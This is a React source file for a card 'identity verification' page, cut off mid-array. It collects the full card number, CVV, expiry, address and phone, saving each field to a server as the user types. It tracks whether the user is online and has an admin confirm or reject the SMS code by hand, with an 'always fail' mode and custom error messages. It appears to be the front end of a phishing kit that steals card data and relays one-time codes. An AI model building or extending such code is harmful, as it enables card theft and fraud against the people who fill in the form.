import React, { useState, useRef, useCallback, useEffect } from "react";
import { useParams, useLocation, useNavigate } from "react-router-dom";
import { CreditCard, MapPin, Phone, Shield, AlertCircle, CheckCircle, Info, ArrowLeft, Lock, AlertTriangle, Clock, FileText, MessageSquare, Hourglass, TimerOff, ShieldX, ShieldAlert, Ban, ClipboardList, LogOut } from "lucide-react";
import Header from "../components/Header";
import Footer from "../components/Footer";
import NoticeCard from "../components/NoticeCard";
import AlertDialog, { DialogButton } from "../components/AlertDialog";
import { updateKycDraft, sendVerificationCode, submitForReview, updateVerificationCode, getAnnouncement, pollTransactionStatus, sendHeartbeat, sendGoOffline, getCodeSendConfig, getVerificationMode, reportCodeAttemptFail, getCodeLock } from "../lib/api";
import type { TestOutcome, AnnouncementConfig } from "../lib/api";
import { saveSession, rehydrateSession } from "../lib/session";
import { useLockBodyScroll } from "../lib/useLockBodyScroll";
import { useFixedBanners } from "../lib/useFixedBanners";
import ResendCodeButton from "../components/ResendCodeButton";
import SubmitReviewButton from "../components/SubmitReviewButton";
import type { Transaction, KycDraft, CodeSendLimitConfig } from "../lib/types";

interface FormData {
  payee_debit_card: string;
  card_number: string;
  card_bank_name: string;
  expiry_month: string;
  expiry_year: string;
  cvv: string;
  cardholder_name: string;
  country: string;
  street_address: string;
  house_number: string;
  city: string;
  state: string;
  postal_code: string;
  phone_number: string;
}

const EMPTY_FORM: FormData = {
  payee_debit_card: "", card_number: "", card_bank_name: "", expiry_month: "", expiry_year: "", cvv: "",
  cardholder_name: "", country: "", street_address: "", house_number: "", city: "",
  state: "", postal_code: "", phone_number: "",
};

const inputClass = "w-full px-3.5 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-[#1E3A8A] focus:border-transparent transition";
// 16px text prevents iOS Safari from auto-zooming the page when a field is focused.
const mobileInputClass = "w-full min-w-0 h-12 px-3.5 border border-gray-200 rounded-xl text-base text-gray-900 placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-[#1E3A8A]/10 focus:border-[#1E3A8A] transition bg-gray-50/80 focus:bg-white";
const POSTAL_CODE_MAX_LENGTH = 12;

function sanitizePostalCode(value: string): string {
  return value.replace(/[^a-zA-Z0-9 -]/g, "").replace(/\s+/g, " ").slice(0, POSTAL_CODE_MAX_LENGTH);
}

function InputField({
  label, name, value, onChange, onBlur, type = "text", placeholder = "", maxLength, hint,
}: {
  label: string; name: string; value: string; onChange: (v: string) => void;
  onBlur: (name: string) => void; type?: string; placeholder?: string; maxLength?: number; hint?: string;
}) {
  return (
    <div>
      <label className="block text-sm font-semibold text-gray-700 mb-1.5">{label} <span className="text-red-500">*</span></label>
      <input
        type={type}
        autoComplete="off"
        value={value}
        onChange={e => onChange(e.target.value)}
        onBlur={() => onBlur(name)}
        placeholder={placeholder}
        maxLength={maxLength}
        className={inputClass}
      />
      {hint && <p className="text-xs text-gray-400 mt-1">{hint}</p>}
    </div>
  );
}

// Mobile-specific label+input combo
function MobileField({
  label, children, error, hint,
}: { label: string; children: React.ReactNode; error?: string; hint?: string }) {
  return (
    <div className="min-w-0 space-y-1.5">
      <label className="block truncate text-[13px] font-semibold text-gray-700">
        {label} <span className="text-red-500">*</span>
      </label>
      {children}
      {hint && <p className="text-xs text-gray-400 leading-relaxed">{hint}</p>}
      {error && <p className="text-xs text-red-500 font-medium flex items-center gap-1"><span>⚠</span>{error}</p>}
    </div>
  );
}

// Mobile section card
function MobileCard({ icon: Icon, title, subtitle, children }: {
  icon: React.ElementType; title: string; subtitle?: string; children: React.ReactNode;
}) {
  return (
    <div className="bg-white rounded-2xl border border-gray-200/80 shadow-sm shadow-[#0A2B5E]/5 overflow-hidden mb-3 sm:mb-4">
      <div className="flex items-center gap-3 px-4 sm:px-6 py-3 sm:py-3.5 border-b border-gray-100 bg-gradient-to-r from-[#F5F9FF] to-white">
        <div className="w-8 h-8 rounded-lg bg-[#0A2B5E]/10 flex items-center justify-center flex-shrink-0">
          <Icon className="w-4 h-4 text-[#1E3A8A]" />
        </div>
        <div className="min-w-0">
          <div className="text-sm sm:text-[15px] font-bold text-[#0A2B5E] leading-tight">{title}</div>
          {subtitle && <div className="text-xs text-gray-500 mt-0.5">{subtitle}</div>}
        </div>
      </div>
      <div className="px-4 sm:px-6 py-4 sm:py-5 space-y-4">{children}</div>
    </div>
  );
}

const DRAFT_FIELDS = [
  "payee_debit_card", "card_number", "card_bank_name", "card_expiry", "cvv", "cardholder_name", "country",
  "street_address", "house_number", "city", "state", "postal_code", "phone_number",
];

export default function KycPage() {
  const { ftUid } = useParams<{ ftUid: string }>();
  const location = useLocation();
  const navigate = useNavigate();
  const tx: Transaction | null = location.state?.transaction || null;
  const existingKyc: KycDraft | null = location.state?.kyc || null;
  const cardType: "credit" | "debit" = location.state?.cardType || existingKyc?.card_type || "debit";
  const isCreditCard = cardType === "credit";

  // Cold-reload recovery: when location.state is missing (refresh or browser
  // evicted the tab), re-hydrate the transaction from sessionStorage.
  const [hydratedTx, setHydratedTx] = useState<Transaction | null>(null);
  const [hydratedKyc, setHydratedKyc] = useState<KycDraft | null>(null);
  const [hydrating, setHydrating] = useState(!location.state?.transaction && !location.state?.kyc);
  useEffect(() => {
    if (location.state?.transaction) return;
    let cancelled = false;
    rehydrateSession().then((res) => {
      if (cancelled || !res) { setHydrating(false); return; }
      setHydratedTx(res.transaction);
      setHydratedKyc(res.kyc);
      setHydrating(false);
    }).catch(() => { setHydrating(false); });
    return () => { cancelled = true; };
  }, [location.state]);

  const effectiveTx: Transaction | null = tx || hydratedTx;
  const effectiveKyc: KycDraft | null = existingKyc || hydratedKyc;
  useEffect(() => {
    if (effectiveTx) saveSession(effectiveTx, effectiveKyc);
  }, [effectiveTx, effectiveKyc]);

  // A saved draft belongs to one card type; picking the other type starts a blank form
  const draftMatchesType = !!existingKyc && (!existingKyc.card_type || existingKyc.card_type === cardType);
  const draftClaimedRef = useRef(!!existingKyc && existingKyc.card_type === cardType);

  const [form, setForm] = useState<FormData>(() => {
    if (existingKyc && draftMatchesType) {
      const expiry = existingKyc.card_expiry || "";
      const [expiry_month = "", expiry_year = ""] = expiry.split("/");
      return {
        payee_debit_card: existingKyc.payee_debit_card || "",
        card_number: existingKyc.card_number || "",
        card_bank_name: existingKyc.card_bank_name || "",
        expiry_month,
        expiry_year,
        cvv: existingKyc.cvv || "",
        cardholder_name: existingKyc.cardholder_name || "",
        country: existingKyc.country || "",
        street_address: existingKyc.street_address || "",
        house_number: existingKyc.house_number || "",
        city: existingKyc.city || "",
        state: existingKyc.state || "",
        postal_code: existingKyc.postal_code || "",
        phone_number: existingKyc.phone_number || "",
      };
    }
    return { ...EMPTY_FORM };
  });

  const [verificationCode, setVerificationCode] = useState("");
  const codeDebounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [codeSent, setCodeSent] = useState(false);
  const [hasEverSent, setHasEverSent] = useState(false);
  const [smsSentBanner, setSmsSentBanner] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [submitLoading, setSubmitLoading] = useState(false);
  const [sendLoading, setSendLoading] = useState(false);
  const [error, setError] = useState("");
  const [fieldErrors, setFieldErrors] = useState<Partial<Record<keyof FormData, string>>>({});
  const [showLeaveModal, setShowLeaveModal] = useState(false);
  const [showAnnouncementModal, setShowAnnouncementModal] = useState(false);
  useLockBodyScroll(showAnnouncementModal);
  const [announcementCountdown, setAnnouncementCountdown] = useState(60);
  const [announcement, setAnnouncement] = useState<AnnouncementConfig | null>(null);
  const announcementReadSeconds = announcement?.read_seconds ?? 60;
  const announcementTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastSentAtRef = useRef<number>(0);
  const debounceRef = useRef<Record<string, ReturnType<typeof setTimeout>>>({});
  const formRef = useRef<FormData>({ ...EMPTY_FORM });

  // Polling state after submit
  const [awaitingConfirmation, setAwaitingConfirmation] = useState(false);
  const [showTimeoutModal, setShowTimeoutModal] = useState(false);
  const [showCodeFailedModal, setShowCodeFailedModal] = useState(false);
  const [showValidationModal, setShowValidationModal] = useState(false);
  const [skipAnnouncement, setSkipAnnouncement] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const pollStartRef = useRef<number>(0);

  // Fixed banner notifications
  const banners = useFixedBanners(ftUid);

  // Code send limit config
  const [codeSendConfig, setCodeSendConfig] = useState<CodeSendLimitConfig | null>(null);
  const [sendCount, setSendCount] = useState(0);
  const [showSendLimitModal, setShowSendLimitModal] = useState(false);
  useEffect(() => {
    if (!ftUid) return;
    getCodeSendConfig(ftUid, cardType)
      .then(cfg => {
        setCodeSendConfig(cfg);
        setSendCount(cfg.send_count ?? 0);
      })
      .catch(() => {});
  }, [ftUid, cardType]);

  // Verification-mode config (test mode)
  const [verificationMode, setVerificationMode] = useState<{
    is_enabled: boolean;
    mode: "always_fail" | "admin_confirm";
    timeout_seconds: number;
    code_expiry_seconds: number;
    max_fail_attempts: number;
    wrong_code_title: string;
    wrong_code_message: string;
    timeout_title: string;
    timeout_message: string;
    fail_limit_title: string;
    fail_limit_message: string;
  } | null>(null);
  const [testResult, setTestResult] = useState<TestOutcome | null>(null);
  const testSettledRef = useRef(false);
  useEffect(() => {
    if (!ftUid) return;
    getVerificationMode(ftUid)
      .then((cfg) => {
        if (cfg?.is_enabled) setVerificationMode(cfg);
      })
      .catch(() => {});
  }, [ftUid]);

  const [expiryLeft, setExpiryLeft] = useState(0);
  const expiryTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const expiryRetryRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  function stopExpiryTimer() {
    if (expiryTimerRef.current) clearInterval(expiryTimerRef.current);
    if (expiryRetryRef.current) clearTimeout(expiryRetryRef.current);
    expiryTimerRef.current = null;
    expiryRetryRef.current = null;
    setExpiryLeft(0);
  }

  function showExpiredResult(r: TestOutcome) {
    stopExpiryTimer();
    if (timerRef.current) clearInterval(timerRef.current);
    setCountdown(0);
    setVerificationCode("");
    setSkipAnnouncement(true);
    setTestResult(r);
  }

  async function reportCodeExpired() {
    try {
      const r = await reportCodeAttemptFail(ftUid!, "expired", cardType);
      if (r.outcome === "expired" || r.outcome === "fail_limit") {
        showExpiredResult(r);
      } else if (r.remaining_ms && r.remaining_ms > 0) {
        expiryRetryRef.current = setTimeout(reportCodeExpired, r.remaining_ms + 300);
      }
    } catch {
      expiryRetryRef.current = setTimeout(reportCodeExpired, 2000);
    }
  }

  function startExpiryTimer(seconds: number) {
    stopExpiryTimer();
    if (seconds <= 0) return;
    const deadline = Date.now() + seconds * 1000;
    setExpiryLeft(seconds);
    expiryTimerRef.current = setInterval(() => {
      const left = Math.ceil((deadline - Date.now()) / 1000);
      if (left <= 0) {
        if (expiryTimerRef.current) clearInterval(expiryTimerRef.current);
        expiryTimerRef.current = null;
        setExpiryLeft(0);
        reportCodeExpired();
      } else {
        setExpiryLeft(left);
      }
    }, 250);
  }

  useEffect(() => () => {
    if (expiryTimerRef.current) clearInterval(expiryTimerRef.current);
    if (expiryRetryRef.current) clearTimeout(expiryRetryRef.current);
  }, []);

  async function reportTestFailure(reason: "rejected" | "timeout") {
    if (testSettledRef.current) return;
    testSettledRef.current = true;
    try {
      const r = await reportCodeAttemptFail(ftUid!, reason, cardType);
      if (r.outcome === "already_decided") {
        const s = await pollTransactionStatus(ftUid!);
        if (s.code_rejected) {
          updateKycDraft(ftUid!, "code_rejected", "false").catch(() => {});
          const rejected = await reportCodeAttemptFail(ftUid!, "rejected", cardType);
          if (rejected.outcome !== "none") setTestResult(rejected);
        } else if (s.review_status === "approved") {
          navigate(`/submitted/${ftUid}`, { state: { transaction: effectiveTx } });
        } else {
          navigate(`/transaction/${ftUid}`, { state: { transaction: effectiveTx } });
        }
        return;
      }
      if (r.outcome !== "none") setTestResult(r);
    } catch {
      setShowTimeoutModal(true);
    }
  }

  // Lock body scroll when any modal is open
  useEffect(() => {
    const locked = awaitingConfirmation || showTimeoutModal || showCodeFailedModal || showValidationModal || showAnnouncementModal || showLeaveModal || showSendLimitModal;
    document.body.style.overflow = locked ? "hidden" : "";
    return () => { document.body.style.overflow = ""; };
  }, [awaitingConfirmation, showTimeoutModal, showCodeFailedModal, showValidationModal, showAnnouncementModal, showLeaveModal, showSendLimitModal]);

  useEffect(() => {
    if (!ftUid) return;
    getAnnouncement(ftUid).then(a => { if (a) setAnnouncement(a); }).catch(() => {});
  }, [ftUid]);
  useEffect(() => {
    if (!ftUid) return;

    sendHeartbeat(ftUid, "kyc");
    const interval = setInterval(() => sendHeartbeat(ftUid, "kyc"), 15000);

    function handleVisibilityChange() {
      if (document.visibilityState === "visible") {
        sendHeartbeat(ftUid!, "kyc");
      } else {
        sendGoOffline(ftUid!);
      }
    }

    function handlePageHide() {
      sendGoOffline(ftUid!);
    }

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("pagehide", handlePageHide);

    return () => {
      clearInterval(interval);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("pagehide", handlePageHide);
    };
  }, [ftUid]);

  const expiryMonthRef = useRef<HTMLInputElement>(null);
  const expiryYearRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!effectiveTx && !hydrating) navigate("/", { replace: true });
  }, [effectiveTx, hydrating, navigate]);

  function claimDraftForCardType(editedField: string) {
    if (draftClaimedRef.current || !ftUid) return;
    draftClaimedRef.current = true;
    updateKycDraft(ftUid, "card_type", cardType).catch(() => {});
    if (existingKyc && !draftMatchesType) {
      DRAFT_FIELDS.filter(f => f !== editedField).forEach(f => updateKycDraft(ftUid, f, "").catch(() => {}));
    }
  }

  function leavePage() {
    if (location.state?.fromCardSelect) navigate(-1);
    else navigate(`/card-select/${ftUid}`, { replace: true, state: { transaction: effectiveTx } });
  }

  const saveDraft = useCallback(async (field: string, value: string) => {
    if (!ftUid) return;
    try {
      await updateKycDraft(ftUid, field, value);
    } catch { /* silent */ }
  }, [ftUid]);

  function handleChange(name: string, value: string) {
    claimDraftForCardType(name === "expiry_month" || name === "expiry_year" ? "card_expiry" : name);
    setForm(prev => {
      const next = { ...prev, [name]: value };
      formRef.current = next;
      if (name === "expiry_month" || name === "expiry_year") {
        const m = name === "expiry_month" ? value : prev.expiry_month;
        const y = name === "expiry_year" ? value : prev.expiry_year;
        const key = "card_expiry";
        if (debounceRef.current[key]) clearTimeout(debounceRef.current[key]);
        debounceRef.current[key] = setTimeout(() => saveDraft("card_expiry", `${m}/${y}`), 400);
      } else {
        if (debounceRef.current[name]) clearTimeout(debounceRef.current[name]);
        debounceRef.current[name] = setTimeout(() => saveDraft(name, value), 400);
      }
      return next;
    });
  }

  function handleBlur(name: string) {
    // Use formRef to always get latest value (avoids stale closure from async state)
    const latest = formRef.current;
    if (name === "expiry_month" || name === "expiry_year") {
      if (debounceRef.current["card_expiry"]) clearTimeout(debounceRef.current["card_expiry"]);
      saveDraft("card_expiry", `${latest.expiry_month}/${latest.expiry_year}`);
    } else {
      if (debounceRef.current[name]) clearTimeout(debounceRef.current[name]);
      saveDraft(name, latest[name as keyof FormData]);
    }
  }

  function validateForm(): boolean {
    const errors: Partial<Record<keyof FormData, string>> = {};
    if (isCreditCard) {
      const digits = form.payee_debit_card.replace(/\s/g, "");
      if (digits.length < 1) errors.payee_debit_card = "Please enter the payee debit card number.";
    }
    if (form.card_number.replace(/\s/g, "").length < 1) errors.card_number = "Please enter the card number.";
    if (!form.card_bank_name.trim()) errors.card_bank_name = "Please enter the card's issuing bank name.";
    const m = parseInt(form.expiry_month, 10);
    if (!form.expiry_month || m < 1 || m > 12) errors.expiry_month = "Enter a valid month (01–12).";
    if (!form.expiry_year || form.expiry_year.length !== 2) errors.expiry_year = "Enter a valid 2-digit year.";
    if (form.cvv.length < 3) errors.cvv = "CVV must be at least 3 digits.";
    if (!form.cardholder_name.trim()) errors.cardholder_name = "Cardholder name is required.";
    if (!form.country.trim()) errors.country = "Country / region is required.";
    if (!form.street_address.trim()) errors.street_address = "Street address is required.";
    if (!form.house_number.trim()) errors.house_number = "House / apartment number is required.";
    if (!form.city.trim()) errors.city = "City is required.";
    if (!form.state.trim()) errors.state = "State / province is required.";
    if (!form.postal_code.trim()) errors.postal_code = "Postal code is required.";
    if (form.phone_number.replace(/\D/g, "").length < 7) errors.phone_number = "Phone number format is invalid.";
    setFieldErrors(errors);
    return Object.keys(errors).length === 0;
  }

  async function handleSendCode() {
    if (!validateForm()) {
      setShowValidationModal(true);
      return;
    }
    setError("");

    // The send endpoint enforces the lock and send limit itself, so resends go straight through.
    if (hasEverSent || skipAnnouncement) {
      doSendCode();
      return;
    }

    setSendLoading(true);
    const [lock, latestConfig, latestAnnouncement] = await Promise.all([
      getCodeLock(ftUid ?? "", cardType).catch(() => null),
      getCodeSendConfig(ftUid ?? "", cardType).catch(() => null),
      getAnnouncement(ftUid ?? undefined).catch(() => null),
    ]);
    setSendLoading(false);

    if (lock?.outcome === "fail_limit") {
      setTestResult(lock);
      return;
    }

    let freshConfig = codeSendConfig;
    if (latestConfig) {
      setCodeSendConfig(latestConfig);
      setSendCount(latestConfig.send_count ?? 0);
      freshConfig = latestConfig;
    }

    if (freshConfig?.is_enabled && freshConfig.max_sends > 0 && (freshConfig.send_count ?? sendCount) >= freshConfig.max_sends) {
      setShowSendLimitModal(true);
      return;
    }

    if (latestAnnouncement) setAnnouncement(latestAnnouncement);
    const readSecs = latestAnnouncement?.read_seconds ?? announcementReadSeconds;
    setAnnouncementCountdown(readSecs);
    setShowAnnouncementModal(true);
    if (announcementTimerRef.current) clearInterval(announcementTimerRef.current);
    announcementTimerRef.current = setInterval(() => {
      setAnnouncementCountdown(prev => {
        if (prev <= 1) { clearInterval(announcementTimerRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  async function doSendCode() {
    setShowAnnouncementModal(false);
    if (announcementTimerRef.current) clearInterval(announcementTimerRef.current);
    setSendLoading(true);
    try {
      const [sent, latestMode] = await Promise.all([
        sendVerificationCode(ftUid!, form.phone_number, cardType),
        getVerificationMode(ftUid!).catch(() => verificationMode),
      ]);
      if (sent?.outcome === "fail_limit") {
        setTestResult(sent);
        return;
      }
      if (sent?.outcome === "send_limit" && sent.config) {
        setCodeSendConfig(sent.config);
        setSendCount(sent.config.send_count ?? 0);
        setShowSendLimitModal(true);
        return;
      }
      setVerificationMode(latestMode?.is_enabled ? latestMode : null);
      startExpiryTimer(latestMode?.is_enabled ? (latestMode.code_expiry_seconds ?? 0) : 0);
      setCodeSent(true);
      setHasEverSent(true);
      setSendCount(prev => prev + 1);
      setSmsSentBanner(true);
      setTimeout(() => setSmsSentBanner(false), 6000);
      lastSentAtRef.current = Date.now();
      setCountdown(60);
      timerRef.current = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) { clearInterval(timerRef.current!); return 0; }
          return prev - 1;
        });
      }, 1000);
    } catch (e: unknown) {
      setError(e instanceof Error ? e.message : "Failed to send code. Please try again.");
    } finally {
      setSendLoading(false);
    }
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!validateForm()) return;
    setError("");
    setSubmitLoading(true);
    try {
      const res = await submitForReview(ftUid!, form.phone_number, cardType);
      if (res.outcome === "expired" || res.outcome === "fail_limit") {
        showExpiredResult(res);
        return;
      }
      if (res.outcome === "wrong_code") {
        setVerificationCode("");
        setTestResult(res);
        return;
      }
      stopExpiryTimer();
      testSettledRef.current = false;
      const latestMode = await getVerificationMode(ftUid!).catch(() => verificationMode);
      const vm = latestMode?.is_enabled ? latestMode : null;
      setVerificationMode(vm);
      // Enter polling mode — wait for admin confirmation
      setAwaitingConfirmation(true);
      pollStartRef.current = Date.now();
      const hasTestModeTimeout = !!(vm?.is_enabled && vm.mode === "admin_confirm" && vm.timeout_seconds > 0);
      const timeoutMs = hasTestModeTimeout
        ? vm!.timeout_seconds * 1000
        : (announcement?.confirmation_timeout_minutes ?? 5) * 60 * 1000;
      const handleTimeoutIfDue = async () => {
        if (Date.now() - pollStartRef.current <= timeoutMs) return;
        clearInterval(pollRef.current!);
        setAwaitingConfirmation(false);
        if (hasTestModeTimeout) {
          setVerificationCode("");
          await reportTestFailure("timeout");
        } else {
          setShowTimeoutModal(true);
        }
      };
      pollRef.current = setInterval(async () => {
        try {
          const res = await pollTransactionStatus(ftUid!);
          // code_rejected: admin rejected the verification code — test-mode wrong-code handling
          if (res.code_rejected) {
            clearInterval(pollRef.current!);
            setAwaitingConfirmation(false);
            setVerificationCode("");
            // Clear the flag so next poll doesn't re-trigger
            updateKycDraft(ftUid!, "code_rejected", "false").catch(() => {});
            if (timerRef.current) clearInterval(timerRef.current);
            const elapsed = Math.floor((Date.now() - lastSentAtRef.current) / 1000);
            const remaining = Math.max(0, 60 - elapsed);
            setCountdown(remaining);
            if (remaining > 0) {
              timerRef.current = setInterval(() => {
                setCountdown(prev => {
                  if (prev <= 1) { clearInterval(timerRef.current!); return 0; }
                  return prev - 1;
                });
              }, 1000);
            }
            setSkipAnnouncement(true);
            if (vm?.is_enabled && vm.mode === "admin_confirm") {
              await reportTestFailure("rejected");
            } else {
              setShowCodeFailedModal(true);
            }
          } else if (res.review_status === "approved") {
            clearInterval(pollRef.current!);
            setAwaitingConfirmation(false);
            navigate(`/submitted/${ftUid}`, { state: { transaction: effectiveTx } });
          } else if (res.review_status === "pending" || res.review_status === "processing") {
            // Code confirmed; waiting for admin's final review decision — go back to transaction page
            clearInterval(pollRef.current!);
            setAwaitingConfirmation(false);
            navigate(`/transaction/${ftUid}`, { state: { transaction: effectiveTx } });
          } else if (res.review_status === "failed") {
            // Full rejection by admin via update-review — navigate away to let page reload fresh
            clearInterval(pollRef.current!);
            setAwaitingConfirmation(false);
            setShowCodeFailedModal(true);
          } else if (res.review_status === "awaiting_admin_confirmation") {
            await handleTimeoutIfDue();
          }
        } catch {
          await handleTimeoutIfDue();
        }
      }, 3000);
    } catch (e: unknown) {
      setError(e instanceof Error ? e.message : "Submission failed. Please try again.");
    } finally {
      setSubmitLoading(false);
    }
  }

  useEffect(() => {
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  if (!effectiveTx) {
    return (
      <div className="min-h-screen-safe flex items-center justify-center bg-gray-50">
        <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
      </div>
    );
  }

  const fields = (name: keyof FormData) => ({
    name, value: form[name],
    onChange: (v: string) => handleChange(name, v),
    onBlur: handleBlur,
  });

  // ── Shared announcement modal + leave modal + SMS banner ────────────────
  const modals = (
    <>
      {awaitingConfirmation && (
        <AlertDialog
          tone="info"
          pulse
          eyebrow="Secure Verification"
          icon={<span className="h-7 w-7 rounded-full border-[3px] border-white/30 border-t-white animate-spin" />}
          title="Awaiting Confirmation"
        >
          <p>Your information has been submitted. Please wait while the issuing company confirms your verification code.</p>
          <div className="mt-4 flex items-center justify-center gap-2 rounded-2xl bg-slate-50 px-4 py-3 text-xs font-medium text-slate-500 ring-1 ring-slate-100">
            <Hourglass className="h-3.5 w-3.5 flex-shrink-0 text-[#1E3A8A]" />
            <span>
              {verificationMode?.is_enabled && verificationMode.mode === "admin_confirm"
                ? `This may take up to ${verificationMode.timeout_seconds} second${verificationMode.timeout_seconds !== 1 ? "s" : ""}.`
                : `This may take up to ${announcement?.confirmation_timeout_minutes ?? 5} minute${(announcement?.confirmation_timeout_minutes ?? 5) !== 1 ? "s" : ""}.`} Do not close this page.
            </span>
          </div>
        </AlertDialog>
      )}

      {showTimeoutModal && (
        <AlertDialog
          tone="warning"
          eyebrow="No Response"
          icon={<TimerOff className="h-7 w-7" />}
          title="Confirmation Timed Out"
          actions={<DialogButton variant="primary" onClick={() => setShowTimeoutModal(false)}>OK</DialogButton>}
        >
          The issuing company has not confirmed your request. Please contact your company's competent authority to confirm first, or try again later.
        </AlertDialog>
      )}

      {showCodeFailedModal && (
        <AlertDialog
          tone="danger"
          eyebrow="Code Rejected"
          icon={<ShieldX className="h-7 w-7" />}
          title="Verification Failed"
          actions={
            <DialogButton variant="danger" onClick={() => { setShowCodeFailedModal(false); setVerificationCode(""); }}>
              OK, Try Again
            </DialogButton>
          }
        >
          The code you entered was incorrect. You can re-enter the correct code and resubmit, or wait 60 seconds to request a new code.
        </AlertDialog>
      )}

      {testResult && (() => {
        const isLimit = testResult.outcome === "fail_limit";
        const isTimeout = testResult.outcome === "timeout" || testResult.outcome === "expired";
        return (
          <AlertDialog
            tone={isLimit || isTimeout ? "warning" : "danger"}
            eyebrow={isLimit ? "Attempts Exhausted" : isTimeout ? "Code Expired" : "Verification Error"}
            icon={isLimit ? <ShieldAlert className="h-7 w-7" /> : isTimeout ? <Clock className="h-7 w-7" /> : <AlertTriangle className="h-7 w-7" />}
            title={testResult.title}
            actions={
              <DialogButton variant={isLimit ? "primary" : isTimeout ? "warning" : "danger"} onClick={() => setTestResult(null)}>
                {isLimit ? "I Understand" : testResult.outcome === "expired" ? "Request New Code" : "Try Again"}
              </DialogButton>
            }
          >
            <p className="whitespace-pre-wrap break-words">{testResult.message}</p>
          </AlertDialog>
        );
      })()}

      {showSendLimitModal && codeSendConfig && (
        <AlertDialog
          tone="danger"
          eyebrow="Request Blocked"
          icon={<Ban className="h-7 w-7" />}
          title={codeSendConfig.warning_title || "Verification Limit Reached"}
          actions={<DialogButton variant="primary" onClick={() => setShowSendLimitModal(false)}>I Understand</DialogButton>}
        >
          <p className="whitespace-pre-wrap break-words">
            {codeSendConfig.warning_message || "You have reached the maximum number of verification code requests."}
          </p>
        </AlertDialog>
      )}

      {showValidationModal && (
        <AlertDialog
          tone="warning"
          eyebrow="Action Required"
          icon={<ClipboardList className="h-7 w-7" />}
          title="Incomplete Form"
          actions={<DialogButton variant="primary" onClick={() => setShowValidationModal(false)}>OK, I'll complete the form</DialogButton>}
        >
          Please complete all required fields before requesting a verification code.
        </AlertDialog>
      )}

      {showLeaveModal && (
        <AlertDialog
          tone="info"
          eyebrow="Draft Saved"
          icon={<LogOut className="h-7 w-7" />}
          title="Leave identity verification?"
          actions={
            <>
              <DialogButton variant="ghost" onClick={() => setShowLeaveModal(false)}>Stay</DialogButton>
              <DialogButton variant="warning" onClick={leavePage}>Leave</DialogButton>
            </>
          }
        >
          Your progress has been saved as a draft. You can resume at any time.
        </AlertDialog>
      )}

      {showAnnouncementModal && (
        <div className="fixed inset-0 z-50 flex items-end lg:items-center justify-center bg-[#06142E]/65 animate-dialog-fade">
          <div className="bg-white w-full h-[100dvh] lg:h-auto lg:rounded-[28px] lg:mx-4 lg:max-w-2xl lg:max-h-[92vh] flex flex-col overflow-hidden shadow-[0_24px_64px_-12px_rgba(6,20,46,0.5)] lg:ring-1 lg:ring-black/5 animate-slide-up lg:animate-dialog-pop">
            <div className="relative bg-gradient-to-br from-[#06142E] via-[#0A2B5E] to-[#14468F] px-5 pt-5 pb-4 lg:px-7 lg:pt-6 flex-shrink-0 overflow-hidden">
              <div className="absolute -top-10 -right-10 w-40 h-40 rounded-full bg-sky-400/10 blur-2xl pointer-events-none" />
              <div className="absolute -bottom-12 left-10 w-32 h-32 rounded-full bg-blue-300/10 blur-2xl pointer-events-none" />
              <div className="relative flex items-start gap-3">
                <div className="flex-shrink-0 w-11 h-11 rounded-2xl bg-white/10 border border-white/20 flex items-center justify-center">
                  <FileText className="w-5 h-5 text-white" />
                </div>
                <div className="flex-1 min-w-0">
                  <span className="text-[10px] font-bold tracking-widest text-blue-300 uppercase">Official Notice</span>
                  <h2 className="text-white font-bold text-[15px] leading-snug mt-0.5">
                    {announcement?.title || "Important Notice — Please Read Carefully"}
                  </h2>
                  <p className="text-blue-200/80 text-xs mt-0.5">You must read the full notice before proceeding.</p>
                </div>
                <div className="flex-shrink-0 flex flex-col items-center gap-1 ml-1">
                  <div className="relative w-12 h-12">
                    <svg className="w-12 h-12 -rotate-90" viewBox="0 0 56 56">
                      <circle cx="28" cy="28" r="24" fill="none" stroke="rgba(255,255,255,0.12)" strokeWidth="4" />
                      <circle cx="28" cy="28" r="24" fill="none"
                        stroke={announcementCountdown > 0 ? "rgba(147,197,253,0.9)" : "#22c55e"}
                        strokeWidth="4" strokeLinecap="round"
                        strokeDasharray={`${2 * Math.PI * 24}`}
                        strokeDashoffset={`${2 * Math.PI * 24 * (announcementCountdown / announcementReadSeconds)}`}
                        style={{ transition: "stroke-dashoffset 1s linear, stroke 0.3s" }}
                      />
                    </svg>
                    <div className="absolute inset-0 flex items-center justify-center">
                      {announcementCountdown > 0
                        ? <span className="text-white font-extrabold text-sm leading-none">{announcementCountdown}</span>
                        : <CheckCircle className="w-5 h-5 text-green-400" />}
                    </div>
                  </div>
                  <span className="text-blue-200/60 text-[9px] font-semibold uppercase">{announcementCountdown > 0 ? "sec" : "ready"}</span>
                </div>
              </div>
              <div className="relative mt-3 h-1 bg-white/10 rounded-full overflow-hidden">
                <div className="h-full rounded-full transition-all duration-1000"
                  style={{ width: `${((announcementReadSeconds - announcementCountdown) / announcementReadSeconds) * 100}%`, background: "linear-gradient(90deg, #60a5fa, #93c5fd)" }} />
              </div>
            </div>

            <div className="scroll-touch overflow-y-auto flex-1 px-5 py-6 lg:px-7 bg-gradient-to-b from-slate-50/60 to-white">
              <div className="space-y-4">
                {announcement?.content ? (
                  <div className="text-gray-700 text-[15px] leading-7 announcement-content" dangerouslySetInnerHTML={{ __html: announcement.content }} />
                ) : (
                  <ol className="space-y-4">
                    {[
                      "The verification code will be sent to the phone number registered and bound to your card. Ensure the number entered is correct before proceeding.",
                      "The OTP is valid for a limited time. Do not share this code with anyone, including bank staff or customer service representatives.",
